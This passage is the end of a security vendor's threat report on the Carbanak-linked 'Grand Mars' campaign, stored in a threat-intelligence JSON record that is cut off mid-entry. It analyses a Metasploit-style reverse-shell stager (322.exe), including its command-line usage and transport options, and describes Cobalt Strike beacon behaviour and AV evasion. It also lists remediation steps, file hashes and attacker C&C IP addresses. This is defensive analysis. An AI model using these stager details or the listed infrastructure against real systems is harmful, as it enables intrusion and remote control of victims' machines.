beacon into memory.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n**Figure 61. \u0003Reflective beacon DLL**\n\nThe beacon DLL loops indefinitely and sleeps for 10 secs between each loop iteration.\n\nThis executable implements a technique to detect the presence of malware detection/AV tools on the compromised\nsystem and/or the network. It connects externally and downloads from a hardcoded host the EICAR Anti-Malware\ntest string. This text is a special ‘dummy’ string for testing security controls such AV software, IDS etc. This is an\nindication to the malware that there are no AV tools on the compromised system.\n\nThe following command and control servers was used:\n\n**•** 95.215.44.12 (HTTP)\n\n**Figure 62. \u0003EICAR test string in X-Malware field**\n\nThis executable file was not detected as malicious by ANY anti-virus tools as reported by VirusTotal as of date of\nwriting this report.\n\n###### 322.exe\n\nThe role of this executable named 322.exe, upon analysis, was found to establish persistent access to the\ncompromised system using a TCP reverse connect backdoor.\n\nThe file hashes are provided in the table below:\n\n**Hash Type** **Value**\n\nMD5 5F73BEB23C45006AD952A71FA62C6F9F\n\nSHA-1 14F5092E2E25EC5479FF5E0F7515A6F17674A845\n\nSHA256 191BDA73661A99E7F2FBE746F4D6105076F1E5A690B124D5F381E218626CA1C2\n\nSSDeep 192:jgm5OgVo4KCobo7y/+KDRSe5fOw81j5NkDQ23C+xan9xpNhhwZhf9UVF8:H1JKCobou/+KtSLjoD5nqxIDf9UVO\n\n**Table 9. \u0003Hashes of 322.exe**\n\nThis executable checks for an AV process on the infected system and based on what it finds, either executes a new\nprocess “wuauclt.exe” (if AV found), or “svchost.exe -k netsvcs”. If it is unable to execute the previous command, it\nspawns explorer exe\n\n|Hash Type|Value|\n|---|---|\n|MD5|5F73BEB23C45006AD952A71FA62C6F9F|\n|SHA-1|14F5092E2E25EC5479FF5E0F7515A6F17674A845|\n|SHA256|191BDA73661A99E7F2FBE746F4D6105076F1E5A690B124D5F381E218626CA1C2|\n|SSDeep|192:jgm5OgVo4KCobo7y/+KDRSe5fOw81j5NkDQ23C+xan9xpNhhwZhf9UVF8:H1JKCobou/+KtSLjoD5nqxIDf9UVO|\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nOn analysis of the disassembled executable code, this malware was found to accept the following three command\nline arguments: {transport} {LHOST} {LPORT}\n\nFor example: 322.exe 4 127.0.0.1 53\n\nIt was also found that the {transport} option can have the following valid values:\n\n**(transport} option** **Interpretation**\n\n0 reverse_tcp_connect with no payload encryption\n\n3 simple bind_tcp shell\n\n4 reverse_tcp_connect with encrypted payload\n\n**Table 10. \u0003Valid {transport} command line options for 322.exe**\n\nWhen the executable is run with one of the three valid options in the table above (along with the correct IP:port\ncombination), it receives a DLL payload from the IP, and injects it reflectively [7] to the process it successfully\nspawned (wuauclt.exe or svchost.exe or explorer.exe). It then transfers the execution to that process. This in turn\nprovides the attackers with one of the three types of command shell access to the compromised system.\n\nIt’s not the first time that cybercriminals have utilized well-known tools since the executable is nothing more than a\ncustomized Metasploit stager responsible for downloading and executing the reverse TCP. The final step of 322.exe\nis to delete itself from the file system in order to leave no trace behind.\n\nVirusTotal score for this malware executable was 8/57 as of last analysis. The low score, combined with the findings\nof the analysis of the file is indicative of a high level of sophistication on the part of the malware authors in being\nable to effectively evade a majority of the AV tools.\n\n|(transport} option|Interpretation|\n|---|---|\n|0|reverse_tcp_connect with no payload encryption|\n|3|simple bind_tcp shell|\n|4|reverse_tcp_connect with encrypted payload|\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n##### Conclusions\n\nDuring the investigations of several malicious executables, obfuscated PowerShell commands and scripts of Visual\nBasic and JavaScript were discovered as listed in Appendix A. Some of the executables after being downloaded by\ntheir parent process were written directly into memory and then reflectively injected [7] into other processes as DLLs\nand were deleted after performing their role. Likewise, the extended usage of PowerShell commands gives the\nadvantage to adversaries of “diskless” aka “memory resident malware” hidden behind the process of their scripting\nhost. Also the practice of utilizing scripts which are flexible by nature is another strong advantage to attackers\nallowing them to effortlessly modify their code.\n\nAdditionally, the use of so many different types of malicious software strongly indicates that several entities are\ncooperating and communicating in the underground markets to exchange tools and techniques. It is also possible\nthat some of the attack’s stages have been performed by different malicious groups of people and then other groups\nhave carried on.\n\nLikewise, the number of network hosts used globally as extraction points or Command & Control Servers is another\nindicator of organized crime operations. Their location and role is depicted below in the European region map (note:\nThree servers located in N. America not shown for simplicity).\n\n**Figure 63. \u0003Malicious hosts geolocation**\n\nThe fact that someone purchased and used legitimate digital certificates issued from a reputable CA (Comodo)\nusing valid or probably fake identities, of Russian origin with details in Moscow, (Grand Mars and Forsajt Ynvest) is\nanother piece of circumstantial evidence pointing to the involvement of organized cybercrime network with strong\nmotivation to these attacks.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nThe proximity of the signature timestamps (indirectly its creation date) to the timeline of attacks suggests strongly\nthat the actors purchased these certificates specifically for use in this operation. Had these digital certificates been\nstolen or “borrowed” from a valid company, it is unlikely for there to have been such strong correlation between the\ntimeline of the attacks and the date/time that the certificates were generated by the CA.\n\nFurthermore, the Pastebin URL used in the attacks as part of the command & control mechanism by the attackers\nbelongs to an individual identified as “Shtokov”. This is yet another (weak) indication of the involvement of Russian/\nEastern European actors in these attacks.\n\n**Figure 64. \u0003Shtokov Pastebin site used in Command and Control**\n\nUsing services such as Google Docs in order to keep track of victims and spreading malicious files becomes a very\nbig challenge for defenders because this way is very difficult to distinguish between good and bad guys using these\npopular public cloud services.\n\nFinally, the attack characteristics of this family of malware share several common traits with the, original, well\nunderstood Carbanak APT campaign, which has been positively attributed to the Russian underground financial\ncybercrime network.\n\nThe only thing that we can be sure is that attackers will not stop seeking new and innovative ways of infecting\ncorporate environments and manipulating public services, which are considered loyal and trustworthy from\nthe public.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n##### Remediation\n\nBased on the findings of our investigation across several cases now dubbed to be part of the “Grand Mars”\nAPT campaign, Trustwave SpiderLabs recommends the following remedial measures to be put in place both to\neffectively negate or minimize the damage caused due to the attacks, and to proactively address the threat prior to\nits realization.\n\n###### TACTICAL (SHORT TO MEDIUM TERM) COUNTERMEASURES\n\n**•** Regular security awareness trainings for all personnel.\n\n**•** Disable execution of VBS/VBE/macros from Internet based documents.\n\n**•** Prohibit execution of files (EXE, VBS etc.) from folders such as AppData, User’s Temp.\n\n**•** Disable full unrestricted Internet access where not required.\n\n**•** Minimize the number and usage of administrator accounts.\n\n**•** Prevent regular users from logging in as administrators.\n\n**•** Implement application layer filtering for widely used protocols such as HTTP etc.\n\n**•** Create unique passwords for local user and administrators and change them frequently.\n\n**•** Limit administrative access only to those systems required.\n\nSince the malware is primarily memory resident, with no disk or file-system level changes made to the host system,\nthe following checks are recommended to be carried out on all endpoints, servers, and the network. We recommend\nto check for indicators of:\n\n**•** Service(s) with randomized names installed and started on the system\n\n**•** Service(s) executed from:\n\n**•** A PowerShell command/script\n\n**•** A suspicious/randomized command, program or binary of unknown origin and purpose\n\n(such as Update.exe/322.exe noted in our report).\n\n**•** A batch (.bat) script with a randomized name\n\n**•** Systems making (or attempting to make) network connections to an external IP, especially on common ports\n\nsuch as 110, 53, 80, 443, 8080 commonly allowed on firewalls for outbound connections but without using the\nactual protocols for these ports.\n\n**•** Scheduled tasks and OS Autoruns locations.\n\nFor a full list of IP addresses and malicious hosts/domains contacted by the malware in this report, please review\nthe Table of IOCs at the end of this section.\n\n###### KEY INDUSTRIES BE AWARE\n\nIt is highly recommended that organizations within the retail, e-commerce and hospitality industries implement\nstrategic countermeasures immediately. Undertake a thorough compromise assessment proactively rather than\nwait for the first signs of attack. Perform a comprehensive threat hunt, using information from this Advanced Threat\nReport, across the network, including servers and endpoints, to identify any signs of malicious activity. Finally,\nevaluate your current incident response capability to identify gaps that affect your organizations ability to respond.\nNo organization can deliver protection against all attacks. But your ability to effectively disrupt an attack, and\nrespond quickly and effectively, will have a long-term impact on your survivability in the face of advanced attacks\nlike Grand Mars.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n\n##### Appendix A: Files\n\n**File name** **Hash (SHA256)**\n\n1-list.docx\n\noleObject1.bin\n\ndttsg.txt\n\nLanCradDriver.ini\n\nLanCradDriver.vbs\n\nstarter.vbs\n\nTransbaseOdbcDriver.js\n\nUVZHDVlZ.exe\n\nUVZHDVlZPVBfXFBeVA.bin\n\n322.exe\n\nAdobeUpdateManagementTool.\nvbs\n\nupdate.exe\n\n1.bat\n\nstr.vbs\n\nvbssysteminstall.vbs\n\nresolv_ip.vbs\n\n\\Windows\\temp\\vb__.vbs\n\n**Table 11. \u0003File IOCs for the Grand Mars APT**\n\n|File name|Hash (SHA256)|Comments|\n|---|---|---|\n|1-list.docx|803009B5CF8D663A2FA3E20651CBDD57DA25908366D886C2EEBC1A4BF7DFC3F0|Email word attachment|\n|oleObject1.bin|EC3980961C6145C96C1220188C6C06AC192AB4B5C4B2E335A96715DE43C62FDB|Encrypted vbs from docx (unprotected. vbe)|\n|dttsg.txt|22F59C3CDABCECF9F71826D1BCE84FE227462142A437E76DC43046DBC63CE1E8|Data copied from pastebin|\n|LanCradDriver.ini|DEA485D817D712A5B61A8F31123F914890183D2F9B0BF0F3AF89366085596D5D|PS1 script downloaded from Google Docs|\n|LanCradDriver.vbs|7683A9760AED259636C8623B577446406FF22E478CC33FA3095F681F54C2AF3B|Caller for LanCradDriver.ini|\n|starter.vbs|270A776CB9855F27452B35F072AFFBBC65023D4BB1F22E0C301AFD2276E7C5EA|Scheduled task (SysChecks) calling TransbaseOdbc­ Driver.js|\n|TransbaseOdbcDriver.js|313E38756B80755078855FE0F1FFEA2EA0D47DFFFCBE2D687AAA8BDB37C892F4|Google Docs + Pastebin communicator|\n|UVZHDVlZ.exe|DDAB9C2F975D336A698F4604AC755586C5451AC8DA0A98ECC5D9B8F6993D4E78|Carbanak, signed file with Comodo certificate|\n|UVZHDVlZPVBfXFBeVA.bin|B84C629AC6AB3F8E03D8A52E8D3E874634C1645154C310F18B8F9FBB9D26BA41|Config file for previous exe|\n|322.exe|191BDA73661A99E7F2FBE746F4D6105076F1E5A690B124D5F381E218626CA1C2|Reflectively injecting dll for reverse shell|\n|AdobeUpdateManagementTool. vbs|DDBF9963FE77ABDF97DE51A27509432ED963657D5F598E2179CEC882B0335334|Communicating with various C&C|\n|update.exe|321BA0DFFEE63518BFE24FF02C0DF6A09692A5D32BCC33AA454AC7431D390F57|Cobalt Strike's post-exploitation tool called Beacon, signed file with Comodo certificate|\n|1.bat|BB0DF2ACCC9F34F432AD7A6279003EF4283508F20BDA005605B1245D0D5164A6|Batch file with PS1 scripts|\n|str.vbs|EA82AD136A0964EA6E1EC30288BD0D6E41E8AEC2D0206D802BCE7429A8DD69BF|Encoded PS scripts (32/64-bit), download XOR-encrypted payload to RAM|\n|vbssysteminstall.vbs|B9D6CE9A1DBBD4888F58FC1B3732EF7FE17B00319103AD965237327908D0D254|VBS installed Adobe­ UpdateManagement­ Tool as a service|\n|resolv_ip.vbs|7AFE9EA1E8A6398E9C3BA4CAA0EEF788D80B6C07235558D23FDC818E3F9E9F6E|VBS reading hostnames from hostnames.txt and pings them|\n|\\Windows\\temp\\vb__.vbs|E9F7E0BE49BF2B3A276A664A57FEE4459B77964F1F3BEAE80BC461634BC2A6AF|Encoded PS scripts (32/64-bit), download XOR-encrypted payload to RAM|\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n##### Appendix B: Malicious hosts/IP addresses\n\n**Host** **Usage** **Geo Location**\n\n62.210.25.121 Reverse shell metepreter (port 80) France\n\n80.84.49.61 Reverse shell metepreter (port 53) UK\n\n80.84.49.66 VBS script C&C United Kingdom\n\n81.17.28.124 AdobeUpdateManagementTool.vbs Switzerland\n\n89.163.248.8 Reverse shell metepreter Germany\n\n89.163.248.6 Reverse shell metepreter Germany\n\n95.215.44.12 Cobalt Strike's Beacon Sweden\n\n95.215.46.221 AdobeUpdateManagementTool.vbs Sweden\n\n95.215.46.229 AdobeUpdateManagementTool.vbs Sweden\n\n95.215.46.234 AdobeUpdateManagementTool.vbs Sweden\n\n95.215.46.249 AdobeUpdateManagementTool.vbs Sweden\n\n95.215.44.94 svchost.exe Sweden\n\n95.215.47.105 Hosting AdobeUpdateManagementTool.vbs Sweden\n\n104.250.138.197 svchost.exe United States\n\n107.181.246.189 Carbanak C&C (port 443) United States\n\n148.251.18.75 AdobeUpdateManagementTool.vbs Germany\n\n179.43.140.85 Carbanak C&C (port 443) Switzerland\n\n179.43.133.34 AdobeUpdateManagementTool.vbs Switzerland\n\n192.99.14.211 Carbanak C&C Canada\n\n212.129.36.175 PowerShell C&C France\n\n**Table 12. \u0003Malicious hosts and IPs**\n\n##### References\n\n**1. Metasploit** **\u0003https://www.metasploit.com/**\n\n**2. PowerSploit** **\u0003https://github.com/PowerShellMafia/PowerSploit**\n\n**3. Veil Framework** **\u0003https://www.veil-framework.com/**\n\n**4. Office File Formats** **\u0003https://msdn.microsoft.com/en-us/library/office/cc313118(v=office.12).aspx**\n\n**5. Script Encryptor** **\u0003http://www.dennisbabkin.com/screnc/**\n\n**6. Procdot Tool** **\u0003http://www.procdot.com/**\n\n**7. Reflective DLL Injection** **\u0003http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf**\n\n|Host|Usage|Geo Location|\n|---|---|---|\n|62.210.25.121|Reverse shell metepreter (port 80)|France|\n|80.84.49.61|Reverse shell metepreter (port 53)|UK|\n|80.84.49.66|VBS script C&C|United Kingdom|\n|81.17.28.124|AdobeUpdateManagementTool.vbs|Switzerland|\n|89.163.248.8|Reverse shell metepreter|Germany|\n|89.163.248.6|Reverse shell metepreter|Germany|\n|95.215.44.12|Cobalt Strike's Beacon|Sweden|\n|95.215.46.221|AdobeUpdateManagementTool.vbs|Sweden|\n|95.215.46.229|AdobeUpdateManagementTool.vbs|Sweden|\n|95.215.46.234|AdobeUpdateManagementTool.vbs|Sweden|\n|95.215.46.249|AdobeUpdateManagementTool.vbs|Sweden|\n|95.215.44.94|svchost.exe|Sweden|\n|95.215.47.105|Hosting AdobeUpdateManagementTool.vbs|Sweden|\n|104.250.138.197|svchost.exe|United States|\n|107.181.246.189|Carbanak C&C (port 443)|United States|\n|148.251.18.75|AdobeUpdateManagementTool.vbs|Germany|\n|179.43.140.85|Carbanak C&C (port 443)|Switzerland|\n|179.43.133.34|AdobeUpdateManagementTool.vbs|Switzerland|\n|192.99.14.211|Carbanak C&C|Canada|\n|212.129.36.175|PowerShell C&C|France|\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n##### List of Figures\n\n###### Figure 1. Email received by victim with a Word attachment . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3\n\n Figure 2. Message body of the suspect email . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3\n\n Figure 3. Microsoft Word .docx attachment (1-list.docx) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3\n\n Figure 4. Word .docx Macro enabled malware . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\n\n Figure 5. Embedded oleObject0.bin file from Word document . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\n\n Figure 6. oleObject.bin showing potentially encoded content . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5\n\n Figure 7. Use of legitimate tool to encrypt/encode VBE script . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5\n\n Figure 8. Tool used for obfuscating the VBE script . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6\n\n Figure 9. Binary to String conversion functions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7\n\n Figure 10. Base64 encode-decode functions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7\n\n Figure 11. Starter.vbs creation (truncated) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8\n\n Figure 12. LanCradDriver.vbs LanCradDriver.ini creation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8\n\n Figure 13. TransbaseOdbcDrive.js creation (truncated) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\n\n Figure 14. Persistence of starter.vbs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\n\n Figure 15. Calculating and encoding of Disk S/N . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10\n\n Figure 16. Checking proxy configuration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10\n\n Figure 17. Main function . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10\n\n Figure 18. sendFormData function . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11\n\n Figure 19. Initial submission Google Form . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12\n\n Figure 20. Files dropped on execution of embedded VBE script . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\n\n Figure 21. Starter.vbs script . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\n\n Figure 22. Process information for TransbaseOdbcDriver.js . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14\n\n Figure 23. LoadLinkSettings() function . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14\n\n Figure 24. Google macro execution output . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15\n\n Figure 25. LogInet() function . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15\n\n Figure 26. Infected system registration using Google Form . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15\n\n Figure 27. Calling GetSourceCode() function . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\n\n Figure 28. GetSourceCode function . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\n\n Figure 29. Code from Pastebin . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\n\n Figure 30. Arguments from Pastebin . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17\n\n Figure 31. Pastebin account used for tracking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17\n\n Figure 32. Downloading code from Google Docs (truncated) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18\n\n Figure 33. Encoded PowerShell commands retrieved from Google Spreadsheet . . . . . . . . . . . . . . . . . . . . . . . . . 18\n\n Figure 34. LaCradDriver.ini (truncated) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19\n\n Figure 35. LanbCradDriver.vbs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19\n\n Figure 36. LanCradDriver.ini (truncated) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\n\n Figure 37. LanCradDriver.ini populated post-execution of TransbaseOdbcDriver.js . . . . . . . . . . . . . . . . . . . . . . . . 20\n\n Figure 38. Role of dropped files and sequence of execution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\n\n Figure 39. Activity diagram showing C&C involving Google Forms and Docs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21\n\n Figure 40. Activity diagram showing C&C in case Google Spreadsheet not available . . . . . . . . . . . . . . . . . . . . . . 22\n\n Figure 41 TCP Reverse Shell from a PowerShell script................................................ 23\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n Figure 42. Registry persistence . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24\n\n Figure 43. SysCheks Scheduled Task persistence . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24\n\n Figure 44. Event showing Pass-the-Hash indicators . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25\n\n Figure 45. Batch file used for spreading . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26\n\n Figure 46. PowerShell script used for spreading . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26\n\n Figure 47. HTTP POST request used to exfiltrate data from compromised system . . . . . . . . . . . . . . . . . . . . . . . . 28\n\n Figure 48. HTTP POST method options . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\n\n Figure 49. XOR key detection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 30\n\n Figure 50. Payload decoding . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 30\n\n Figure 51. Starting Anunak after decrypting it . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 30\n\n Figure 52. Procdot visualization of UVZHDVIZ.exe. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 30\n\n Figure 53. Digital certificate details of UVZHDVIZ.exe (Grand Mars) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\n\n Figure 54. Digital certificate details of update.exe . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32\n\n Figure 55. Decryption routine with XOR key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32\n\n Figure 56. Loader Code . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33\n\n Figure 57. PE Executable . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33\n\n Figure 58. Memory allocation for payload . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33\n\n Figure 59: Routine to decrypt beacon DLL . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33\n\n Figure 60. Decrypted beacon DLL . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33\n\n Figure 61. Reflective beacon DLL . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34\n\n Figure 62. EICAR test string in X-Malware field . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34\n\n Figure 63. Malicious hosts geolocation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36\n\n Figure 64. Shtokov Pastebin site used in Command and Control . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37\n\n##### List of Tables\n\n###### Table 1. Hashes of Starter.vbs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\n\n Table 2. Hashes of TransbaseOdbcDriver.js . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14\n\n Table 3. Hashes of LanCradDriver.vbs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19\n\n Table 4. Hashes of LanCradDriver.ini . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19\n\n Table 5. Hashes of AdobeUpdateManagementTool.vbs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\n\n Table 6. Examples of supported commands . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28\n\n Table 7. Hashes of UVZHDVlZ.exe . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\n\n Table 8. Hashes of Update.exe . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\n\n Table 9. Hashes of 322.exe . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34\n\n Table 10. Valid {transport} command line options for 322.exe . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35\n\n Table 11. File IOCs for the Grand Mars APT . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 39\n\n Table 12. Malicious hosts and IPs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40\n\n\n-----\n\n###### trustwave.com Copyright © 2017 Trustwave Holdings, Inc.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2017/2017.01.18.Operation-Grand-Mars/Operation%20Grand%20Mars.pdf"
    ],
    "report_names": [
        "Operation Grand Mars"
    ],
    "threat_actors": [
        {
            "id": "c9617bb6-45c8-495e-9759-2177e61a8e91",
            "created_at": "2022-10-25T15:50:23.405039Z",
            "updated_at": "2025-03-27T02:00:55.462193Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Carbanak",
                "Anunak"
            ],
            "source_name": "MITRE:Carbanak",
            "tools": [
                "Carbanak",
                "Mimikatz",
                "PsExec",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bee22874-f90e-410b-93f3-a2f9b1c2e695",
            "created_at": "2022-10-25T16:07:23.45097Z",
            "updated_at": "2025-03-27T02:02:09.808919Z",
            "deleted_at": null,
            "main_name": "Chafer",
            "aliases": [
                "APT 39",
                "Cobalt Hickman",
                "ITG07",
                "Radio Serpens",
                "Remix Kitten",
                "TA454"
            ],
            "source_name": "ETDA:Chafer",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Antak",
                "CACHEMONEY",
                "EternalBlue",
                "HTTPTunnel",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "MechaFlounder",
                "Metasploit",
                "Mimikatz",
                "NBTscan",
                "NSSM",
                "Non-sucking Service Manager",
                "POWBAT",
                "Plink",
                "PuTTY Link",
                "Rana",
                "Remcom",
                "Remexi",
                "RemoteCommandExecution",
                "SafetyKatz",
                "UltraVNC",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "nbtscan",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
